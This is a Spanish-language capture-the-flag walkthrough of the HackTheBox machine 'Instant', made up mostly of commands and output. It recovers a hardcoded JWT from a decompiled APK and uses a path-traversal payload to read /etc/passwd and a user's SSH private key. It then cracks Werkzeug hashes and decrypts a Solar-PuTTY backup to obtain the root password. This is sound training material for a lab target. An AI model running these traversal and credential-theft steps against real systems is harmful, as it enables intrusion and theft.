# Tutorial de Instant de HackTheBox en Español

![card](../../img/Instant/Instant.png)

Empezaremos la máquina con un escaneo sobre todo el rango de puertos TCP.

```
nmap -sS -p- -Pn -n --min-rate 5000 10.129.109.123

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 10:38 CET
Nmap scan report for 10.129.109.123
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.53 seconds
```

Los puertos abiertos en la máquina son el `22` y el `80`, normalmente los servicios corriendo en esos puertos son `ssh` y `http` respectivamente. Vamos a comprobarlo con un analisis más exhaustivo sobre estos dos puertos.

```
nmap -sVC -p 22,80 10.129.109.123 -oN nmap/services

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 10:47 CET
Nmap scan report for 10.129.109.123
Host is up (0.046s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://instant.htb/
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.49 seconds
```

Efectivamente los servicios corriendo en estos puertos son `http` y `ssh`.

En el servicio http, nos está dando un error: `Did not follow redirect to http://instant.htb/`. Esto puede deberse a que nuestra máquina no sabe cual es ese dominio pues no está contemplado los servidores dns a los que apunta nuestra máquina. Para contemplar localmente este dominio añadiremos la linea `10.129.109.123  instant.htb` al archivo `/etc/hosts`.

```
echo '10.129.109.123  instant.htb' >> /etc/hosts
```

Una vez hecho un reconocimiento básico y contemplado el dominio vamos a entrar al sitio web.

![website](../../img/Instant/website.png)

En la página podemos ver un boton `DOWNLOAD NOW`, que nos descarga una **apk** de android. Vamos a descompilarla e inspeccionarla a fondo.

```
apktool d instant.apk -o instant-apk
```

Una vez descomprimida, comprobaremos el archivo `network_security_config.xml`. Donde encontramos dos subdominios que podemos contemplar en el `/etc/hosts` y atacar posteriormente.

```
cat res/xml/network_security_config.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="true">
        <domain includeSubdomains="true">mywalletv1.instant.htb</domain>
        <domain includeSubdomains="true">swagger-ui.instant.htb</domain>
    </domain-config>
</network-security-config>
```

```
echo '10.129.109.123  mywalletv1.instant.htb swagger-ui.instant.htb' >> /etc/hosts
```

El primer subdominio nos devuelve un código de estado 404, por lo que de momento no indagaremos más.

![mywalletv1](../../img/Instant/mywalletv1-subdomain.png)

En el segundo nos devuelve una guía de una api.

![swagger](../../img/Instant/swagger-ui.png)

Vamos a hacer una peticion a cualquier ruta de la api para probarla.

```
curl -sX GET http://swagger-ui.instant.htb/api/v1/admin/list/users | jq
```

```json
{
  "Description": "Unauthorized!",
  "Status": 401
}
```

Como no estamos autenticados no podemos hacer peticiones a la api, por lo que vamos a seguir investigando la apk en busca de algun token o alguna credencial para autenticarnos.

En el código de la aplicación descompilado, nos llama la atención el archivo `AdminActivities` por lo que vamos a examinarlo.

```
cat smali/com/instantlabs/instant/AdminActivities.smali
```

```smali
    const-string v2, "Authorization"

    const-string v3, "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA"

    .line 25
    invoke-virtual {v1, v2, v3}, Lokhttp3/Request$Builder;->addHeader(Ljava/lang/String;Ljava/lang/String;)Lokhttp3/Request$Builder;
```

En el archivo `smali/com/instantlabs/instant/AdminActivities.smali` hay lo que parece un **JWT** (Json Web Token), que puede que nos permita sera autorizados por la api. Vamos a intentar hacer una solicitud de nuevo a la api pero ahora con el token en el header `Authorization`.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' http://swagger-ui.instant.htb/api/v1/admin/list/users | jq
```

```json
{
  "Status": 200,
  "Users": [
    {
      "email": "admin@instant.htb",
      "role": "Admin",
      "secret_pin": 87348,
      "status": "active",
      "username": "instantAdmin",
      "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
    },
    {
      "email": "shirohige@instant.htb",
      "role": "instantian",
      "secret_pin": 42845,
      "status": "active",
      "username": "shirohige",
      "wallet_id": "458715c9-b15e-467b-8a3d-97bc3fcf3c11"
    }
  ]
}
```

Como en users no encontramos ninguna credencial ni nada parecido, vamos a comprobar que hay en los relacionados con los `logs`.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/view/logs" | jq
```

```json
{
  "Files": [
    "1.log"
  ],
  "Path": "/home/shirohige/logs/",
  "Status": 201
}
```

Vemos que hay un log `1.log` y que todos los logs están en el directorio `/home/shirohige/logs/`. Vamos a leer este log.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" | jq
```

```json
{
  "/home/shirohige/logs/1.log": [
    "This is a sample log testing\n"
  ],
  "Status": 201
}
```

No hay nada interesante en este log. Sin embargo, al estar leyendo archivos en un directorio, podriamos probar con un **path traversal**. Intentaremos leer el `/etc/passwd`.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../etc/passwd" | jq -r '."/home/shirohige/logs/../../../etc/passwd"[]' | tr -s '\n'

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
dhcpcd:x:100:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
messagebus:x:101:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:102:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
usbmux:x:103:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
shirohige:x:1001:1002:White Beard:/home/shirohige:/bin/bash
_laurel:x:999:990::/var/log/laurel:/bin/false
```

Efectivamente se ha acontecido un **path traversal**. Para escalar esto a una consola interactiva vamos a leer su clave publica de ssh.

```
curl -sX GET -H 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA' "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../.ssh/id_rsa" | jq -r '."/home/shirohige/logs/../.ssh/id_rsa"[]' | tr -s '\n' > id_rsa_shirohige

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B
nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH

...etc...

HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP
5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r
bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==
-----END OPENSSH PRIVATE KEY-----
```

Le damos los permisos adecuados.

```
chmod 600 id_rsa_shirohige
```

Y nos conectamos a la máquina víctima utilizando esta clave privada.

```
ssh shirohige@instant.htb -i id_rsa_shirohige

shirohige@instant:~$
```

Una vez dentro ya podemos leer la flag del usuario.

```
cd
cat user.txt
```

Investigando la capeta projects en el home del usuario shirohige encontramos una base de datos de sqlite.

```
cd projects/mywallet/Instant-Api/mywallet/instance/
ls

instant.db
```

Vamos a investigar esta base de datos en busca de credenciales o algo interesante que podamos utilizar para escalar privilegios.

```
sqlite3 instant.db
```

Mostramos las tablas.

```
sqlite> .tables
wallet_transactions  wallet_users         wallet_wallets
```

Y sacamos todos los usuarios y contraseñas.

```
sqlite> select username, password from wallet_users;

instantAdmin|pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
shirohige|pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed
```

Obtenemos hashes cifrados con Werkzeug. Para intentar romperlos utilizaremos una herramienta `Werkzeug-Cracker`.

```
git clone https://github.com/AnataarXVI/Werkzeug-Cracker
```

Creamos un entorno virtual e instalamos las dependencias.

```
python3 -m venv venv
source venv/bin/activate
pip3 install -r requirements.txt
```

Metemos los hashes en archivos distintos para intentar romperlos.

```
echo 'pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978' > hash.txt
echo 'pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed' > hash2.txt
```

Lo ejecutamos con el primero...

```
python werkzeug_cracker.py -p hash.txt -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
Cracking pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978 |████████████████████████████████| 929/929
```

No hemos encontrado la contraseña al menos con este diccionario. Vamos a probar con el otro.

```
python werkzeug_cracker.py -p hash2.txt -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
Cracking pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed |████                            | 113/929
Password found: estrella
```

El hash es de la contraseña estrella. Intentaremos autenticarnos como root con esta contraseña.

```
su root
Password: estrella

su: Authentication failure
```

No ha funcionado. Nos apuntamos esta contraseña para posteriormente.

Inspeccionando la máquina encontramos en el directorio `/opt` un directorio `backups` con otro directorio `Solar-PuTTY` con un archivo `sessions-backup.dat` en él.

```
ls /opt/backups/Solar-PuTTY

sessions-backup.dat
```

Este archivo es una copia de seguridad de una sesión de Solar-Putty, que suele contener credenciales.

Para desencriptar este archivo utilizaremos `SolarPuttyDecrypt`, que solo funciona en windows.

Primero lo clonaremos en nuestra máquina atacante.

```
git clone https://github.com/VoidSec/SolarPuttyDecrypt
cd SolarPuttyDecrypt_v1
```

Nos hacemos un servidor `HTTP` con python.

```
python3 -m http.server 80
```

Y lo descargamos en una máquina virtual de windows (tanto el script como el archivo `.dat`).

![python server dat](../../img/Instant/python-server-dat.png)

Ya podemos ejecutar el `SolarPuttyDecrypt.exe` pasandole como argumento el archivo `sessions-backup.dat` y pasandole como contraseña para descifrar la encontrada anteriormente en los hashes: "estrella".

```
C:\Users\delo\Desktop\SolarPuttyDecrypt_v1>.\SolarPuttyDecrypt.exe sessions-backup.dat estrella
```

```json
{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}
```

En el archivo desencriptado encontramos un campo: `"Password": "12**24nzC!r0c%q12"` con el que podemos intentar autenticarnos como root.

```
su root
Password: 12**24nzC!r0c%q12
```

Ya como root podemos leer la flag de root.

```
cd
cat root.txt
```

Tras acabar la máquina no olvides eliminar la línea del `/etc/hosts` correspondiente a la máquina para evitar que se acumulen líneas con cada máquina que hagas.

Si te ha parecido útil, considera dejar una estrella al proyecto. Gracias y mucha suerte en tus próximas máquinas ❤️.